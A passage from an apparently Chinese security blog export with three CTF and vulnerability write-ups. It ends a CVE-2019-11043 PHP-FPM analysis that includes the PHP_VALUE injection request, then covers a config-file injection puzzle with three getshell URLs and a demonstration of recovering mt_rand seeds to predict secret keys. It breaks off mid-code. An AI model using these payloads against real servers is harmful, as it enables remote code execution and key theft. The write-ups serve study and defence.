<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FCGI_HASH_FUNC(var, var_len) \</span></span><br><span class="line">	(UNEXPECTED(var_len &lt; <span class="number">3</span>) ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)var_len : \</span><br><span class="line">		(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[<span class="number">3</span>]) &lt;&lt; <span class="number">2</span>) + \</span><br><span class="line">		(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[var_len<span class="number">-2</span>]) &lt;&lt; <span class="number">4</span>) + \</span><br><span class="line">		(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[var_len<span class="number">-1</span>]) &lt;&lt; <span class="number">2</span>) + \</span><br><span class="line">		var_len)</span><br></pre></td></tr></table></figure>

<p>解决了覆盖内容的问题，但是还有一个问题没有解决，怎么能够让<code>pos</code>的末尾字节变为0之后，恰好指向全局变量<code>HTTP_EBUT</code>呢？方法还是爆破。发送payload如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0</span><br><span class="line"><span class="attribute">D-Pisos</span>: 8===========================================================D</span><br><span class="line"><span class="attribute">Ebut</span>: mamku tvoyu</span><br></pre></td></tr></table></figure>

<p>不断的增加<code>D-Pisos</code>的长度，把 <code>HTTP_EBUT</code> 的存储位置向后挤，当返回的响应中出现 <code>Set-Cookie</code> 字段的时候，就说明偏移正确了，覆盖成功。</p>
<p>这一点在内存布局上，也可以直接得到验证。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-11-52-53.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-11-52-53.png"></p>
<p>这<code>HTTP_D_PISOS</code> 就是为了占位置的,把 <code>HTTP_EBUT</code> 向后面挤。</p>
<p>当服务器返回<code>Set-Cookie</code>头的时候，就说明了<code>PHP_VALUE</code> 覆盖成功了。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-13-00-19.png" alt="http://pic.wonderkun.cc/uploads/2019/10/2019-10-29-13-00-19.png"></p>
<p>再往后面，就是web方面的知识了，就是控制了<code>PHP_VALUE</code>的情况下怎么getshell，这里感觉不能使用<code>php://input</code>进行rce，经过朋友的提示，可能是因为 <code>/PHP_VALUE%0Aauto_prepend_file=php://input</code> 的长度太长了，超过了 34 个字节。 </p>
<h3 id="0x6-总结"><a href="#0x6-总结" class="headerlink" title="0x6 总结"></a>0x6 总结</h3><p>这个漏洞原本只是一个任意地址的单字节置NULL的漏洞，经过外国大佬的一步步寻挖掘，将影响一步一步变大，实现了一个范围内地址可写。同时利用可写范围内的数据特殊性质，最后导致RCE。 </p>
<p>更加精妙的是漏洞利用过程，在盲打的情况下，巧妙的利用一些web知识和二进制知识，寻找爆破的边界条件，找到出内存中合适的偏移，<br>最终实现了RCE，不得不佩服国外大佬的 @Andrew Danau 的技术追求和技术能力。</p>
<h3 id="0x7-参考文献"><a href="#0x7-参考文献" class="headerlink" title="0x7 参考文献"></a>0x7 参考文献</h3><p><a href="https://paper.seebug.org/1063/" target="_blank" rel="noopener">https://paper.seebug.org/1063/</a><br><a href="https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227" target="_blank" rel="noopener">https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227</a><br><a href="http://www.mit.edu/~yandros/doc/specs/fcgi-spec.html" target="_blank" rel="noopener">http://www.mit.edu/~yandros/doc/specs/fcgi-spec.html</a><br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a><br><a href="http://www.rai4over.cn/2019/10/25/php-fpm-Remote-Code-Execution-%E5%88%86%E6%9E%90-CVE-2019-11043/" target="_blank" rel="noopener">http://www.rai4over.cn/2019/10/25/php-fpm-Remote-Code-Execution-%E5%88%86%E6%9E%90-CVE-2019-11043/</a><br><a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a><br><a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78599</a></p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>php写入配置文件的经典漏洞</title>
    <url>/2017/02/28/php%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>phithon师父在小蜜圈里放了一个经典的配置文件写入问题漏洞.</p>
<a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'option'</span>])) <span class="keyword">die</span>();</span><br><span class="line">$str = addslashes($_GET[<span class="string">'option'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./config.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">'|\$option=\'.*\';|'</span>, <span class="string">"\$option='$str';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./config.php'</span>, $file);</span><br></pre></td></tr></table></figure>
<p>config.php 的内容如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$option=<span class="string">'test'</span>;</span><br></pre></td></tr></table></figure>
<p>要求是要getshell,这个场景十分经典，常用在修改配置文件写入的时候。<br>此处不存在之前说的那个配置文件中用的是”双引号”引起任意代码执行的问题,这这里面用的是单引号,而且 addslashes()处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.</p>
<h4 id="方法一-利用换行符来绕过正则匹配的问题"><a href="#方法一-利用换行符来绕过正则匹配的问题" class="headerlink" title="方法一,利用换行符来绕过正则匹配的问题"></a>方法一,利用换行符来绕过正则匹配的问题</h4><p>可以看到正则匹配的是以下内容:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$option=<span class="string">'任意内容'</span></span><br></pre></td></tr></table></figure>
<p>任意内容里面是可以包含转移符 \ 的,所以我们利用下面的方法:</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a';%0aphpinfo();//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>
<p>执行完第一个之后,config.php中的内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$option=<span class="string">'a\';</span></span><br><span class="line"><span class="string">phpinfo();//'</span>;</span><br></pre></td></tr></table></figure>
<p>但是这样并没有办法执行phpinfo(),因为我们插入的 单引号 被转移掉了,所以phpinfo()还是在单引号的包裹之内.<br>我们在访问下面这个</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>
<p>因为正则 .* 会匹配行内的任意字符无数次.所以 \ 也被认为是其中的一部分,也会被替换掉,执行完之后,config.php中的内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$option=<span class="string">'a'</span>;</span><br><span class="line">phpinfo();<span class="comment">//';</span></span><br></pre></td></tr></table></figure>

<p>转义符就被替换掉了,就成功的getshell.</p>
<h4 id="方法二-利用-preg-replace函数的问题"><a href="#方法二-利用-preg-replace函数的问题" class="headerlink" title="方法二,利用 preg_replace函数的问题:"></a>方法二,利用 preg_replace函数的问题:</h4><p>用preg_replace()的时候replacement(第二个参数)也要经过正则引擎处理，所以正则引擎把<code>\\</code>转义成了<code>\</code><br>也就是说如果字符串是<code>\\\&#39;</code>,经过 preg_replace()的处理,就变为 <code>\\&#39;</code>,单引号就逃出来了.<br>所以payload如下:</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a\';phpinfo();//</span></span><br></pre></td></tr></table></figure>
<p>config.php变为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$option=<span class="string">'a\\'</span>;phpinfo();<span class="comment">//';</span></span><br></pre></td></tr></table></figure>
<p>道理就是  <code>a\&#39;;phpinfo();//</code>  经过 addslashes()处理之后,变为<code>a\\\&#39;;phpinfo();//</code> 然后两个反斜杠被preg_replace变成了一个,导致单引号逃脱.</p>
<h4 id="方法三-利用-preg-replace-函数的第二个参数的问题"><a href="#方法三-利用-preg-replace-函数的第二个参数的问题" class="headerlink" title="方法三, 利用 preg_replace() 函数的第二个参数的问题"></a>方法三, 利用 preg_replace() 函数的第二个参数的问题</h4><p>先看官方对preg_replace()函数的描述<a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">manual</a><br>函数原型:</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="built_in">int</span> $limit = <span class="number">-1</span> [, <span class="built_in">int</span> &amp;$count ]] )</span><br></pre></td></tr></table></figure>
<p>对replacement的描述.<br>replacement中可以包含后向引用<code>\\n</code> 或(php 4.0.4以上可用)$n，语法上首选后者。 每个 这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n 可以是0-99，<code>\\0</code>和$0代表完整的模式匹配文本。</p>
<p>所以我们可以用:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=;phpinfo();</span><br><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=%<span class="number">00</span> 或者 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=<span class="variable">$0</span></span><br></pre></td></tr></table></figure>
<p>执行第一条后config.php的内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$option=<span class="string">';phpinfo();'</span>;</span><br></pre></td></tr></table></figure>
<p>再执行第二条后config.php的内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$option=<span class="string">'$option='</span>;phpinfo();<span class="string">';'</span>;</span><br></pre></td></tr></table></figure>
<p>刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的.</p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>php的随机数的安全性分析</title>
    <url>/2017/03/16/php%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="php的随机数的安全性分析"><a href="#php的随机数的安全性分析" class="headerlink" title="php的随机数的安全性分析"></a>php的随机数的安全性分析</h2><p>在php中,产生随机数的方法有 rand()函数和mt_rand()函数,官方说mt_rand()函数要比rand()函数的速度快四倍,至于到底是不是这样的?他们两个的区别到底在哪,不是今天要讨论的重点,今天要说的是这两个函数的安全性问题.</p>
<a id="more"></a>

<p>说到rand()函数和mt_rand()函数,我们就不得不说到与他们相对应的两个播种随机数种子的函数,srand() 和 mt_srand()<br>我们来看如下代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">mt_srand(<span class="number">1234</span>);</span><br><span class="line">srand(<span class="number">123</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"rand 函数在种子是1234时产生的随机数序列:\n"</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;<span class="number">5</span>;$i++)&#123;</span><br><span class="line">   <span class="keyword">echo</span> rand().<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"mt_rand 函数在种子是1234时产生的随机数序列:\n"</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;<span class="number">5</span>;$i++)&#123;</span><br><span class="line">   <span class="keyword">echo</span> mt_rand().<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="https://pic.wonderkun.cc/uploads/2017/03/1.png" alt="1" width="618" height="739" class="alignnone size-full wp-image-586" />

<p>测试发现无论是rand()函数还是mt_rand()函数,当随机数种子相同的时候,无论运行多少次,产生的随机数序列都是一样的,所以如果我们在代码中自己播种了随机数种子,但是泄露了这个种子,就会导致产生的随机数序列被别人猜到,造成安全问题.</p>
<p>但是在 php  &gt; 4.2.0 的版本中,不再需要手动用 srand() 或 mt_srand() 函数给随机数发生器播种了，已自动完成。也就是说随机数种子不用我们给了,php会自动播种一个种子,这样就不存在种子泄露的问题了,但是这样就安全了吗?</p>
<p>我们继续往下面看:</p>
<h3 id="mt-rand-函数的安全性问题"><a href="#mt-rand-函数的安全性问题" class="headerlink" title="mt_rand() 函数的安全性问题"></a>mt_rand() 函数的安全性问题</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'echo getrandmax()."\n".mt_getrandmax()."\n"; echo (pow(2,31)-1)."\n";'</span></span><br></pre></td></tr></table></figure>

<img src="https://pic.wonderkun.cc/uploads/2017/03/2.png" alt="2" width="1241" height="246" class="alignnone size-full wp-image-587" />

<p>在我的 linux 64 位系统中,rand() 和 mt_rand() 产生的最大随机数都是2147483647,<br>正好是 2^31-1 , 也就是说随机播种的种子也是在这个范围中,0 - 2147483647 的这个范围是允许我们进行爆破的. 但是用 php爆破比较慢,有大牛已经用c写了一个爆破种子程序php_mt_seed,请参考这里<a href="http://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">http://www.openwall.com/php_mt_seed/</a></p>
<p>下面演示一下它的用法:</p>
<img src="https://pic.wonderkun.cc/uploads/2017/03/3.png" alt="3" width="950" height="501" class="alignnone size-full wp-image-588" />

<p>在例子中,我没有自己播种种子,而是让php自动去播种一个种子并产生一个随机数,然后用 php_mt_seed 这个工具把产生的随机数作为参数,去爆破种子,最后的得到了四个结果.<br>经过验证,四个结果都是对的.都会产生这样的一个随机数.  </p>
<p>但是还有一个疑问,就是 php manual 中说,自动播种种子是指:在每次调用 mt_rand()函数之前都播种一次种子呢,还是多次调用 mt_rand()函数之前,只播种一次种子呢,这对于我们能否猜到产生的随机数序列至关重要.  </p>
<p>看下面的测试:</p>
<img src="https://pic.wonderkun.cc/uploads/2017/03/4.png" alt="4" width="1094" height="623" class="alignnone size-full wp-image-589" />

<p>在测试中,在没有进行手工播种的情况下产生两个连续的随机数,然后去爆破种子,得到了四个可能种子,经过测试发现其中一个种子产生的随机数序列和预期的相同,<strong>所以可以猜想在php中产生一系列的随机数时,只进行了一次播种!</strong></p>
<p>那请考虑下面代码的安全性:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_generate_password</span><span class="params">($length = <span class="number">12</span>, $special_chars = true)</span> </span>&#123;</span><br><span class="line">  $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">  <span class="keyword">if</span> ( $special_chars )</span><br><span class="line">  $chars .= <span class="string">'!@#$%^&amp;*()'</span>;</span><br><span class="line"></span><br><span class="line">  $password = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">  $password .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> $password;</span><br><span class="line">&#125;</span><br><span class="line">$key = wp_generate_password(<span class="number">16</span>, <span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[*] This is a key for public:"</span>.$key.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$private = wp_generate_password(<span class="number">10</span>,<span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[*] Create a private key which you don't know:"</span>.$private.<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们是否可以根据公开的key,猜到 $private 呢?<br>运行一次上面的代码:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">njctf$ php mtRand.php</span><br><span class="line">[*] This is a key <span class="keyword">for</span> public:uS66FDD9LCR62UV3</span><br><span class="line">[*] Create a private key <span class="built_in">which</span> you don\<span class="string">'t know:t3JSUHzYAv</span></span><br></pre></td></tr></table></figure>

<p>下面演示破解过程,首先获得public key在每一位在字符串中的位置:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">"uS66FDD9LCR62UV3"</span>;</span><br><span class="line">$randStr = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">   $pos = strpos($randStr,$str[$i]);</span><br><span class="line">   <span class="keyword">echo</span> $pos.<span class="string">" "</span>.$pos.<span class="string">" "</span>.<span class="string">"0 "</span>.(strlen($randStr)<span class="number">-1</span>).<span class="string">" "</span>;</span><br><span class="line">   <span class="comment">//整理成方便 php_mt_seed 测试的格式</span></span><br><span class="line">  <span class="comment">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后用 php_mt_seed 进行破解,这个需要的时间还是挺长的,几分钟左右.</p>
<img src="https://pic.wonderkun.cc/uploads/2017/03/5.png" alt="5" width="1919" height="261" class="alignnone size-full wp-image-590" />

<p>已经成功的破解了一个seed,下面看这个seed对不对:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_generate_password</span><span class="params">($length = <span class="number">12</span>, $special_chars = true)</span> </span>&#123;</span><br><span class="line">  $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">  <span class="keyword">if</span> ( $special_chars )</span><br><span class="line">  $chars .= <span class="string">'!@#$%^&amp;*()'</span>;</span><br><span class="line"></span><br><span class="line">  $password = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">  $password .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> $password;</span><br><span class="line">&#125;</span><br><span class="line">mt_srand(<span class="number">4030923041</span>); <span class="comment">//手工添加了这个种子</span></span><br><span class="line">$key = wp_generate_password(<span class="number">16</span>, <span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[*] This is a key for public:"</span>.$key.<span class="string">"\n"</span>;</span><br><span class="line">$private = wp_generate_password(<span class="number">10</span>,<span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[*] Create a private key which you don't know:"</span>.$private.<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>跟刚才的结果一模一样 :</p>
<img src="https://pic.wonderkun.cc/uploads/2017/03/6.png" alt="6" width="898" height="171" class="alignnone size-full wp-image-591" />

<p>这样就说明了,我们只需要拿到public key,就可以预测到private key 的值了.</p>
<p>但是在有的一些环境中，public key可能在private key之后产生，但是知道private key的位数<br>怎么预测private key呢？<br>强大的php_mt_seed_4.0,支持一些统配的写法，把未知的都写成参数 0 0 0 0 就可以了<a href="http://www.openwall.com/php_mt_seed/README" target="_blank" rel="noopener">php_mt_seed详细的使用说明</a>。它就会跳过前面的mt_rand()的一些输出，直接匹配后面的：</p>
<p>下面测试我们获得了private key，来猜测public key的情况。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment"># mtRand.php</span></span><br><span class="line">$str = <span class="string">"t3JSUHzYAv"</span>;</span><br><span class="line">$randStr = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">   $pos = strpos($randStr,$str[$i]);</span><br><span class="line">   <span class="keyword">echo</span> $pos.<span class="string">" "</span>.$pos.<span class="string">" "</span>.<span class="string">"0 "</span>.(strlen($randStr)<span class="number">-1</span>).<span class="string">" "</span>;</span><br><span class="line">   <span class="comment">//整理成方便 php_mt_seed 测试的格式</span></span><br><span class="line">  <span class="comment">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>下面就开始破解：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  Desktop <span class="built_in">echo</span>  $(python -c <span class="string">"print '0 '*64"</span>) $(php mtRand.php) | xargs   ~/script/php_mt_seed-4.0/php_mt_seed</span><br><span class="line">Pattern: SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP SKIP EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xfc000000 - 0xffffffff, speed 65.2 Mseeds/s</span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 0, trying 0xf0000000 - 0xf1ffffff, speed 5.5 Mseeds/s</span><br><span class="line">seed = 0xf0430121 = 4030923041 (PHP 5.2.1 to 7.0.x; HHVM)</span><br><span class="line">Found 1, trying 0xfe000000 - 0xffffffff, speed 5.5 Mseeds/s</span><br><span class="line">Found 1</span><br></pre></td></tr></table></figure>

<p>可以看到破解得到的seed和之前的一样。</p>
<p>接下来看一个 njctf中的一个例子,只贴部分关键代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</span><br><span class="line">        <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</span><br><span class="line">        <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</span><br><span class="line">        <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</span><br><span class="line">        <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</span><br><span class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">        $str .= $set[$ch];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span 